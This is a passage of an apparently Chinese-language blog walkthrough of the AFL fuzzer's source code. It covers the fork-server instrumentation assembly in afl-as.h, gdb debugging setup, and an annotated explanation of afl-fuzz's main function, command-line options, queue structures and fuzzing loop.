&quot;\n&quot;  &quot;  &#x2F;* Phone home and tell the parent that we&#39;re OK. (Note that signals with\n&quot;  &quot;     no SA_RESTART will mess it up). If this fails, assume that the fd is\n&quot;  &quot;     closed because we were execve()d from an instrumented binary, or because\n&quot;  &quot;     the parent doesn&#39;t want to use the fork server. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  movq $4, %rdx               &#x2F;* length    *&#x2F;\n&quot;  &quot;  leaq __afl_temp(%rip), %rsi &#x2F;* data      *&#x2F;\n&quot;  &quot;  movq $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;, %rdi       &#x2F;* file desc *&#x2F;\n&quot;  CALL_L64(&quot;write&quot;)  &quot;\n&quot;  &quot;  cmpq $4, %rax\n&quot;  &quot;  jne  __afl_fork_resume\n&quot;  &quot;\n&quot;  &quot;__afl_fork_wait_loop:\n&quot;  &quot;\n&quot;  &quot;  &#x2F;* Wait for parent by reading from the pipe. Abort if read fails. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  movq $4, %rdx               &#x2F;* length    *&#x2F;\n&quot;  &quot;  leaq __afl_temp(%rip), %rsi &#x2F;* data      *&#x2F;\n&quot;  &quot;  movq $&quot; STRINGIFY(FORKSRV_FD) &quot;, %rdi             &#x2F;* file desc *&#x2F;\n&quot;  CALL_L64(&quot;read&quot;)  &quot;  cmpq $4, %rax\n&quot;  &quot;  jne  __afl_die\n&quot;  &quot;\n&quot;  &quot;  &#x2F;* Once woken up, create a clone of our process. This is an excellent use\n&quot;  &quot;     case for syscall(__NR_clone, 0, CLONE_PARENT), but glibc boneheadedly\n&quot;  &quot;     caches getpid() results and offers no way to update the value, breaking\n&quot;  &quot;     abort(), raise(), and a bunch of other things :-( *&#x2F;\n&quot;  &quot;\n&quot;  CALL_L64(&quot;fork&quot;);父进程通过管道与子进程通信  &quot;  cmpq $0, %rax\n&quot;  &quot;  jl   __afl_die\n&quot;  &quot;  je   __afl_fork_resume\n&quot;  &quot;\n&quot;  &quot;  &#x2F;* In parent process: write PID to pipe, then wait for child. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  movl %eax, __afl_fork_pid(%rip)\n&quot;  &quot;\n&quot;  &quot;  movq $4, %rdx                   &#x2F;* length    *&#x2F;\n&quot;  &quot;  leaq __afl_fork_pid(%rip), %rsi &#x2F;* data      *&#x2F;\n&quot;  &quot;  movq $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;, %rdi             &#x2F;* file desc *&#x2F;\n&quot;  CALL_L64(&quot;write&quot;)  &quot;\n&quot;  &quot;  movq $0, %rdx                   &#x2F;* no flags  *&#x2F;\n&quot;  &quot;  leaq __afl_temp(%rip), %rsi     &#x2F;* status    *&#x2F;\n&quot;  &quot;  movq __afl_fork_pid(%rip), %rdi &#x2F;* PID       *&#x2F;\n&quot;  CALL_L64(&quot;waitpid&quot;)  &quot;  cmpq $0, %rax\n&quot;  &quot;  jle  __afl_die\n&quot;  &quot;\n&quot;  &quot;  &#x2F;* Relay wait status to pipe, then loop back. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  movq $4, %rdx               &#x2F;* length    *&#x2F;\n&quot;  &quot;  leaq __afl_temp(%rip), %rsi &#x2F;* data      *&#x2F;\n&quot;  &quot;  movq $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;, %rdi         &#x2F;* file desc *&#x2F;\n&quot;  CALL_L64(&quot;write&quot;);父进程等待子进程执行完毕后，将状态信息传递回子进程  &quot;\n&quot;  &quot;  jmp  __afl_fork_wait_loop\n&quot;;子进程关闭管道文件描述符后继续执行  &quot;\n&quot;  &quot;__afl_fork_resume:\n&quot;;子进程恢复执行  &quot;\n&quot;  &quot;  &#x2F;* In child process: close fds, resume execution. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  movq $&quot; STRINGIFY(FORKSRV_FD) &quot;, %rdi\n&quot;  CALL_L64(&quot;close&quot;)  &quot;\n&quot;  &quot;  movq $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;, %rdi\n&quot;  CALL_L64(&quot;close&quot;);关闭管道文件描述符  &quot;\n&quot;  &quot;  popq %rdx\n&quot;  &quot;  popq %rdx\n&quot;  &quot;\n&quot;  &quot;  movq %r12, %rsp\n&quot;  &quot;  popq %r12\n&quot;  &quot;\n&quot;  &quot;  movq  0(%rsp), %rax\n&quot;  &quot;  movq  8(%rsp), %rcx\n&quot;  &quot;  movq 16(%rsp), %rdi\n&quot;  &quot;  movq 32(%rsp), %rsi\n&quot;  &quot;  movq 40(%rsp), %r8\n&quot;  &quot;  movq 48(%rsp), %r9\n&quot;  &quot;  movq 56(%rsp), %r10\n&quot;  &quot;  movq 64(%rsp), %r11\n&quot;  &quot;\n&quot;  &quot;  movq  96(%rsp), %xmm0\n&quot;  &quot;  movq 112(%rsp), %xmm1\n&quot;  &quot;  movq 128(%rsp), %xmm2\n&quot;  &quot;  movq 144(%rsp), %xmm3\n&quot;  &quot;  movq 160(%rsp), %xmm4\n&quot;  &quot;  movq 176(%rsp), %xmm5\n&quot;  &quot;  movq 192(%rsp), %xmm6\n&quot;  &quot;  movq 208(%rsp), %xmm7\n&quot;  &quot;  movq 224(%rsp), %xmm8\n&quot;  &quot;  movq 240(%rsp), %xmm9\n&quot;  &quot;  movq 256(%rsp), %xmm10\n&quot;  &quot;  movq 272(%rsp), %xmm11\n&quot;  &quot;  movq 288(%rsp), %xmm12\n&quot;  &quot;  movq 304(%rsp), %xmm13\n&quot;  &quot;  movq 320(%rsp), %xmm14\n&quot;  &quot;  movq 336(%rsp), %xmm15\n&quot;  &quot;\n&quot;  &quot;  leaq 352(%rsp), %rsp\n&quot;;恢复寄存器的值  &quot;\n&quot;  &quot;  jmp  __afl_store\n&quot;;跳转回路径记录逻辑  &quot;\n&quot;  &quot;__afl_die:\n&quot;  &quot;\n&quot;  &quot;  xorq %rax, %rax\n&quot;  CALL_L64(&quot;_exit&quot;);退出程序  &quot;\n&quot;  &quot;__afl_setup_abort:\n&quot;;初始化失败处理  &quot;\n&quot;  &quot;  &#x2F;* Record setup failure so that we don&#39;t keep calling\n&quot;  &quot;     shmget() &#x2F; shmat() over and over again. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  incb __afl_setup_failure(%rip)\n&quot;;增加 __afl_setup_failure 的值，避免重复初始化  &quot;\n&quot;  &quot;  movq %r12, %rsp\n&quot;  &quot;  popq %r12\n&quot;  &quot;\n&quot;  &quot;  movq  0(%rsp), %rax\n&quot;  &quot;  movq  8(%rsp), %rcx\n&quot;  &quot;  movq 16(%rsp), %rdi\n&quot;  &quot;  movq 32(%rsp), %rsi\n&quot;  &quot;  movq 40(%rsp), %r8\n&quot;  &quot;  movq 48(%rsp), %r9\n&quot;  &quot;  movq 56(%rsp), %r10\n&quot;  &quot;  movq 64(%rsp), %r11\n&quot;  &quot;\n&quot;  &quot;  movq  96(%rsp), %xmm0\n&quot;  &quot;  movq 112(%rsp), %xmm1\n&quot;  &quot;  movq 128(%rsp), %xmm2\n&quot;  &quot;  movq 144(%rsp), %xmm3\n&quot;  &quot;  movq 160(%rsp), %xmm4\n&quot;  &quot;  movq 176(%rsp), %xmm5\n&quot;  &quot;  movq 192(%rsp), %xmm6\n&quot;  &quot;  movq 208(%rsp), %xmm7\n&quot;  &quot;  movq 224(%rsp), %xmm8\n&quot;  &quot;  movq 240(%rsp), %xmm9\n&quot;  &quot;  movq 256(%rsp), %xmm10\n&quot;  &quot;  movq 272(%rsp), %xmm11\n&quot;  &quot;  movq 288(%rsp), %xmm12\n&quot;  &quot;  movq 304(%rsp), %xmm13\n&quot;  &quot;  movq 320(%rsp), %xmm14\n&quot;  &quot;  movq 336(%rsp), %xmm15\n&quot;  &quot;\n&quot;  &quot;  leaq 352(%rsp), %rsp\n&quot;;恢复寄存器  &quot;\n&quot;  &quot;  jmp __afl_return\n&quot;;跳转回返回逻辑  &quot;\n&quot;  &quot;.AFL_VARS:\n&quot;  &quot;\n&quot;;以下为其他变量定义，定义共享内存指针、Fork Server PID、临时变量和全局共享内存指针#ifdef __APPLE__...#ifndef COVERAGE_ONLY  &quot;  .comm   __afl_prev_loc, 8\n&quot;#endif &#x2F;* !COVERAGE_ONLY *&#x2F;  &quot;  .comm   __afl_fork_pid, 4\n&quot;  &quot;  .comm   __afl_temp, 4\n&quot;  &quot;  .comm   __afl_setup_failure, 1\n&quot;#else  &quot;  .lcomm   __afl_area_ptr, 8\n&quot;#ifndef COVERAGE_ONLY  &quot;  .lcomm   __afl_prev_loc, 8\n&quot;#endif &#x2F;* !COVERAGE_ONLY *&#x2F;  &quot;  .lcomm   __afl_fork_pid, 4\n&quot;  &quot;  .lcomm   __afl_temp, 4\n&quot;  &quot;  .lcomm   __afl_setup_failure, 1\n&quot;#endif &#x2F;* ^__APPLE__ *&#x2F;  &quot;  .comm    __afl_global_area_ptr, 8, 8\n&quot;  &quot;\n&quot;  &quot;.AFL_SHM_ENV:\n&quot;  &quot;  .asciz \&quot;&quot; SHM_ENV_VAR &quot;\&quot;\n&quot;;环境变量定义  &quot;\n&quot;  &quot;&#x2F;* --- END --- *&#x2F;\n&quot;  &quot;\n&quot;;#endif &#x2F;* !_HAVE_AFL_AS_H *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="afl-fuzz"><a href="#afl-fuzz" class="headerlink" title="afl-fuzz"></a>afl-fuzz</h2><h3 id="gdb调试-2"><a href="#gdb调试-2" class="headerlink" title="gdb调试"></a>gdb调试</h3><p>gcc 生成 test 可执行文件后，在 test 所在目录创建文件夹 in 和 out，在文件夹 in 中创建文本文件 testcase，内容 abc</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">su</span><span class="token builtin class-name">echo</span> core <span class="token operator">></span>/proc/sys/kernel/core_patterngdb <span class="token punctuation">..</span>/AFL/afl-fuzzpwndbg<span class="token operator">></span> <span class="token builtin class-name">set</span> args <span class="token parameter variable">-i</span> <span class="token keyword">in</span> <span class="token parameter variable">-o</span> out <span class="token parameter variable">-M</span> fuzzer1 ./test pwndbg<span class="token operator">></span> <span class="token function">dir</span> <span class="token punctuation">..</span>/AFLpwndbg<span class="token operator">></span> b mainpwndbg<span class="token operator">></span> r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><iframe src="https://www.processon.com/editor/view/flow?fromnew=1&amp;isTemp=true&amp;template=true&amp;chartId=6410452f3e892476c12dcb28" frameborder="0" style="width: 2000px; height: 1001px; border: none; position: relative; z-index: 4;"></iframe><h3 id="main-2"><a href="#main-2" class="headerlink" title="main"></a>main</h3><ul><li><p>如果设置了环境变量 AFL_BENCH_JUST_ONE，则设置 exit_1 为 1，设置单次执行标志</p></li><li><p>输出 afl-fuzz 版本信息，从 DOC_PATH 获取文档路径，如果不存在就设置为 docs（文档路径为 &#x2F;usr&#x2F;local&#x2F;share&#x2F;doc&#x2F;afl，存在一些 tips 和 README）</p></li><li><p>获取时间根据时间和进程号生成随机数种子</p></li><li><p>解析参数（调试的参数为：<code>-i in -o out ./test -M fuzzer1</code>）</p><ul><li>-i：指定输入目录，输入目录是 “-“ 表示从当前目录恢复测试，不能重复指定</li><li>-o：指定输出目录，不能重复指定</li><li>-M：主节点同步 ID</li><li>-S：指定从属模块的同步 ID</li><li>-f：指定目标程序的输入文件</li><li>-x：指定字典文件</li><li>-t：设置目标程序的超时时间，不小于 5ms，可以带后缀 “+” 表示动态超时</li><li>-m：内存限制，存在该参数则设置 mem_limit_given &#x3D; 1，参数值可以有 T &#x2F; G &#x2F; k &#x2F; M，不小于 5m，32位系统不大于 2000m</li><li>-d：跳过 AFL 的确定性变异阶段，直接进入随机变异阶段</li><li>-B：加载之前生成的位图文件，用于跳过已发现的路径，参数值为之前二进制文件生成的 fuzz_bitmap</li><li>-C：启用 crash 模式，只记录导致 crash 的测试用例</li><li>-n：dumb 模式，AFL 不使用复杂的变异策略</li><li>-T：设置 AFL 的 banner 信息</li><li>-Q：qemu 模式，用于测试非原生二进制文件，如果未设置内存限制，则默认使用 qemu_mode 的内存限制</li><li>default：使用了其他参数，则调用 usage 显示帮助信息并退出</li></ul></li><li><p>检查是否指定了 -i 和 -o，没有就调用 usage 显示帮助信息并退出</p></li><li><p><a href="##setup_signal_handlers">setup_signal_handlers</a> 注册信号处理函数</p></li><li><p><a href="##check_asan_opts">check_asan_opts</a> 读取 ASAN_OPTIONS 和 MSAN_OPTIONS 并进行一些检查</p></li><li><p>如果通过 -M 或 -S 指定了 sync_id 就调用 <a href="##fix_up_sync">fix_up_sync</a> 进行一些设置</p></li><li><p>限制输入文件夹和输出文件夹不能是同一个文件夹，如果是就显示报错信息后退出</p></li><li><p>如果开启了 dumb 模式，不能同时开启 crash 模式 或 qemu 模式，同时开启了就显示报错信息后退出</p></li><li><p>获取一系列相关环境变量</p></li><li><p><a href="##save_cmdline">save_cmdline</a> 保存命令行参数，在保存 crash 信息的时候使用</p></li><li><p><a href="##fix_up_banner">fix_up_banner</a> 更新 use_banner</p></li><li><p><a href="##check_if_tty">check_if_tty</a> 根据环境变量 AFL_NO_UI 设置 not_on_tty 进而确定是界面显示还是逐行输出</p></li><li><p>进行一些 cpu 操作</p><ul><li><a href="##get_core_count">get_core_count</a> 获取核心数量</li><li><a href="##bind_to_free_cpu">bind_to_free_cpu</a> 绑定到一个空闲的 CPU，有助于提升多线程或多进程的性能</li><li><a href="##check_crash_handling">check_crash_handling</a> 避免 crash 被误判为超时的情况</li><li><a href="##check_cpu_governor">check_cpu_governor</a> 检查 cpu 是否可调，如果可调则建议用户把 cpu 定在最高频率</li></ul></li><li><p><a href="##setup_post">setup_post</a> 设置 post_handler</p></li><li><p><a href="##setup_shm">setup_shm</a> 初始化共享内存</p></li><li><p><a href="##init_count_class16">init_count_class16</a> 初始化 16bit 查找表</p></li><li><p>进行一些文件操作</p><ul><li><p><a href="##setup_dirs_fds">setup_dirs_fds</a> 在工作目录下创建一些文件夹（hangs，queue，crash），并打开一些 fd 备用，例如 &#x2F;dev&#x2F;urandom</p></li><li><p><a href="##read_testcases">read_testcases</a> 把初始 corpus（语料库） 读入 queue</p></li><li><p><a href="##load_auto">load_auto</a> 读入自动生成的 extra（extras 是指用户提供的或自动生成的特殊字符串（称为 tokens），用于在 fuzzing 过程中对测试用例进行变异，通过插入或替换这些 tokens 来生成更有针对性的测试用例，从而提高 fuzzing 的效率和覆盖率）</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">extra_data</span> <span class="token punctuation">&#123;</span>  u8<span class="token operator">*</span> data<span class="token punctuation">;</span>                           <span class="token comment">/* Dictionary token data  字典标记数据               */</span>  u32 len<span class="token punctuation">;</span>                            <span class="token comment">/* Dictionary token length 字典标记长度              */</span>  u32 hit_cnt<span class="token punctuation">;</span>                        <span class="token comment">/* Use count in the corpus 使用语料库中的计数         */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">extra_data</span><span class="token operator">*</span> extras<span class="token punctuation">;</span>     <span class="token comment">/* Extra tokens to fuzz with 用于模糊测试的额外标记    */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><a href="##pivot_inputs">pivot_inputs</a> 把初始 corpus 复制到工作目录的 queue 文件夹下</p></li><li><p>用户通过 -x 指定了 dictionary，则调用 <a href="##load_extras">load_extras</a> 从 dictionary 导入 extra</p></li><li><p>未设置 timeout_given 则调用 <a href="##find_timeout">find_timeout</a> 防止不停调整超时时间</p></li><li><p><a href="##detect_file_args">detect_file_args</a> 判断目标程序，对文件名为 @@ 的情况进行特判</p></li><li><p>未使用 -f 指定目标程序，则调用 <a href="##setup_stdio_file">setup_stdio_file</a> 创建 .cur_input 文件并打开，设为 out_fd</p></li><li><p><a href="##check_binary">check_binary</a> 检查目标程序</p></li></ul></li><li><p>获取当前时间为开始时间 start_time</p></li><li><p>如果是 qemu 模式则调用 get_qemu_argv 获取命令行参数，并将结果赋值给 use_argv，否则 use_argv 存储可执行文件名 test</p></li><li><p><a href="##perform_dry_run">perform_dry_run</a> 执行输入文件夹中预先准备的所有测试用例，以确认目标程序是否按预期工作，只在初始输入时执行一次</p></li><li><p><a href="##cull_queue">cull_queue</a> 精简队列</p></li><li><p><a href="##show_init_stats">show_init_stats</a> 更新 ui 信息，使用 ui 界面展示</p></li><li><p><a href="##find_start_position">find_start_position</a> 获取 seek_to 从上次中断的地方继续进行模糊测试</p></li><li><p><a href="##write_stats_file">write_stats_file</a> 更新 fuzzer_stats 文件，记录 fuzzer 的当前状态</p></li><li><p><a href="##save_auto">save_auto</a> 保存 AFL 自动生成的测试用例片段 auto extras</p></li><li><p>接收到用户中断指令则跳转到 stop_fuzzing 停止 fuzz</p></li><li><p>暂停 4s 让用户看到 ui 信息，如果收到用户的取消指令则跳转到 stop_fuzzing 停止 fuzz</p></li><li><p>进入 fuzz 主循环</p><ul><li><p><a href="##cull_queue">cull_queue</a> 精简队列</p></li><li><p>如果 queue_cur 为空，即所有 queue 被执行了一遍</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">queue_entry</span> <span class="token punctuation">&#123;</span>  u8<span class="token operator">*</span> fname<span class="token punctuation">;</span>                          <span class="token comment">/* File name for the test case 测试用例的文件名      */</span>  u32 len<span class="token punctuation">;</span>                            <span class="token comment">/* Input length 输入长度                            */</span>  u8  cal_failed<span class="token punctuation">,</span>                     <span class="token comment">/* Calibration failed? 校准失败？                    */</span>      trim_done<span class="token punctuation">,</span>                      <span class="token comment">/* Trimmed? 修剪？                                  */</span>      was_fuzzed<span class="token punctuation">,</span>                     <span class="token comment">/* Had any fuzzing done yet? 模糊测试已经完成？       */</span>      passed_det<span class="token punctuation">,</span>                     <span class="token comment">/* Deterministic stages passed? 确定性阶段通过？      */</span>      has_new_cov<span class="token punctuation">,</span>                    <span class="token comment">/* Triggers new coverage? 触发新覆盖？               */</span>      var_behavior<span class="token punctuation">,</span>                   <span class="token comment">/* Variable behavior? 变量行为？                     */</span>      favored<span class="token punctuation">,</span>                        <span class="token comment">/* Currently favored? 在fs中标记为冗余？              */</span>      fs_redundant<span class="token punctuation">;</span>                   <span class="token comment">/* Marked as redundant in the fs?                  */</span>  u32 bitmap_size<span class="token punctuation">,</span>                    <span class="token comment">/* Number of bits set in bitmap 位图中设置的位数      */</span>      exec_cksum<span class="token punctuation">;</span>                     <span class="token comment">/* Checksum of the execution trace 执行跟踪的校验和   */</span>  u64 exec_us<span class="token punctuation">,</span>                        <span class="token comment">/* Execution time (us) 执行时间 (us)                 */</span>      handicap<span class="token punctuation">,</span>                       <span class="token comment">/* Number of queue cycles behind 后面的队列周期数     */</span>      depth<span class="token punctuation">;</span>                          <span class="token comment">/* Path depth 路径深度                               */</span>  u8<span class="token operator">*</span> trace_mini<span class="token punctuation">;</span>                     <span class="token comment">/* Trace bytes, if kept 跟踪字节（如果保留）           */</span>  u32 tc_ref<span class="token punctuation">;</span>                         <span class="token comment">/* Trace bytes ref count 跟踪字节引用计数             */</span>  <span class="token keyword">struct</span> <span class="token class-name">queue_entry</span> <span class="token operator">*</span>next<span class="token punctuation">,</span>           <span class="token comment">/* Next element, if any 下一个元素（如果有）           */</span>                     <span class="token operator">*</span>next_100<span class="token punctuation">;</span>       <span class="token comment">/* 100 elements ahead  前面 100 个元素               */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">queue_entry</span> <span class="token operator">*</span>queue<span class="token punctuation">,</span>     <span class="token comment">/* Fuzzing queue (linked list) 模糊测试队列（链接列表）     */</span>                          <span class="token operator">*</span>queue_cur<span class="token punctuation">,</span> <span class="token comment">/* Current offset within the queue 队列中的当前偏移量      */</span>                          <span class="token operator">*</span>queue_top<span class="token punctuation">,</span> <span class="token comment">/* Top of the list 列表顶部                              */</span>                          <span class="token operator">*</span>q_prev100<span class="token punctuation">;</span> <span class="token comment">/* Previous 100 marker  前100个标记                      */</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>queue_cycle + 1 记录完整执行次数</p></li><li><p>初始化 current_entry、cur_skipped_paths、queue_cur</p></li><li><p>检查 seek_to 是否为空，不为空就找到 seek_to 位置</p></li><li><p>show_stats 刷新 ui 信息</p><pre class="line-numbers language-none"><code class="language-none">                       american fuzzy lop 2.57b (fuzzer1)┌─ process timing ─────────────────────────────────────┬─ overall results ─────┐│        run time : 0 days, 3 hrs, 57 min, 6 sec       │  cycles done : 0      ││   last new path : none seen yet                      │  total paths : 1      ││ last uniq crash : none seen yet                      │ uniq crashes : 0      ││  last uniq hang : none seen yet                      │   uniq hangs : 0      │├─ cycle progress ────────────────────┬─ map coverage ─┴───────────────────────┤│  now processing : 0 (0.00%)         │    map density : 0.00% &#x2F; 0.00%         ││ paths timed out : 0 (0.00%)         │ count coverage : 1.00 bits&#x2F;tuple       │├─ stage progress ────────────────────┼─ findings in depth ────────────────────┤│  now trying : init                  │ favored paths : 1 (100.00%)            ││ stage execs : 0&#x2F;-                   │  new edges on : 1 (100.00%)            ││ total execs : 8                     │ total crashes : 0 (0 unique)           ││  exec speed : 0.00&#x2F;sec (zzzz...)    │  total tmouts : 0 (0 unique)           │├─ fuzzing strategy yields ───────────┴───────────────┬─ path geometry ────────┤│   bit flips : 0&#x2F;0, 0&#x2F;0, 0&#x2F;0                         │    levels : 1          ││  byte flips : 0&#x2F;0, 0&#x2F;0, 0&#x2F;0                         │   pending : 1          ││ arithmetics : 0&#x2F;0, 0&#x2F;0, 0&#x2F;0                         │  pend fav : 1          ││  known ints : 0&#x2F;0, 0&#x2F;0, 0&#x2F;0                         │ own finds : 0          ││  dictionary : 0&#x2F;0, 0&#x2F;0, 0&#x2F;0                         │  imported : 0          ││       havoc : 0&#x2F;0, 0&#x2F;0                              │ stability : 100.00%    ││        trim : n&#x2F;a, n&#x2F;a                              ├────────────────────────┘────────      if (not_on_tty) &#123;───────────────────────┘          [cpu000: 12%]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果不是在终端环境下运行就输出当前循环周期并且刷新输出，确保立即显示</p></li><li><p>执行一次完整的扫描之后，新发现的路径数与执行之前的一样（没有发现任何新的路径），如果使用剪接，则增加无发现循环计数，否则启用剪接，如果不一样就将无发现循环计数置零</p></li><li><p>更新 prev_queued 路径数</p></li><li><p>如果设置了同步ID，并且是第一次循环，且设置了环境变量 AFL_IMPORT_FIRST，就调用 <a href="##sync_fuzzers">sync_fuzzers</a> 同步 fuzzer 状态</p></li></ul></li><li><p><a href="##fuzz_one">fuzz_one</a> 对 queue_cur 执行一次模糊测试，返回是否跳过</p></li><li><p>如果没有停止信号，有同步ID，没有跳过当前模糊测试，达到同步间隔（默认为5），就调用 sync_fuzzers 同步 fuzzer 状态</p></li><li><p>如果设置了单次执行标志（exit_1），设置即将停止标志</p></li><li><p>如果接收到停止信号，退出循环</p></li><li><p>移动到队列中的下一个条目，当前条目索引递增</p></li></ul></li><li><p>当前 queue 不为空，即未全部测试完，则显示当前状态</p></li><li><p><a href="##write_bitmap">write_bitmap</a> 保存当前trace_bits，用于记录目标程序的执行路径覆盖率</p></li><li><p><a href="##write_stats_file">write_stats_file</a> 更新 AFL 的统计信息文件 fuzzer_stats</p></li><li><p><a href="##save_auto">save_auto</a> 保存 AFL 自动生成的测试用例片段 auto extras</p></li><li><p>最后一段 stop_fuzzing 标签用于在停止 fuzz 的时候 goto 到这里结束程序</p><ul><li>输出中断信息</li><li>如果在第一个周期提醒用户测试在第一个周期内被中断，结果可能不完整，并提供了恢复测试的建议</li><li>关闭文件释放资源</li><li>输出结束信息并退出程序</li></ul></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  s32 opt<span class="token punctuation">;</span>  u64 prev_queued <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">// 之前排队的路径数，用于统计和同步</span>  u32 sync_interval_cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> seek_to<span class="token punctuation">;</span>  <span class="token comment">// 同步计数器和用于存储 seek 位置的变量</span>  u8 <span class="token operator">*</span>extras_dir <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">// 额外字典目录</span>  u8 mem_limit_given <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">// 内存限制标志，表示是否提供了内存限制</span>  u8 exit_1 <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_BENCH_JUST_ONE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 如果设置了环境变量 AFL_BENCH_JUST_ONE，则设置 exit_1 为 1，设置单次执行标志</span>  <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> use_argv<span class="token punctuation">;</span>  <span class="token comment">// 存储命令行参数的数组</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token function">SAYF</span><span class="token punctuation">(</span>cCYA <span class="token string">"afl-fuzz "</span> cBRI VERSION cRST <span class="token string">" by &lt;lcamtuf@google.com>\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  doc_path <span class="token operator">=</span> <span class="token function">access</span><span class="token punctuation">(</span>DOC_PATH<span class="token punctuation">,</span> F_OK<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"docs"</span> <span class="token operator">:</span> DOC_PATH<span class="token punctuation">;</span><span class="token comment">// 检查文档路径是否存在，如果不存在则使用 "docs"，该文件夹下有 README，路径为 /usr/local/share/doc/afl</span>  <span class="token function">gettimeofday</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tv<span class="token punctuation">,</span> <span class="token operator">&amp;</span>tz<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">srandom</span><span class="token punctuation">(</span>tv<span 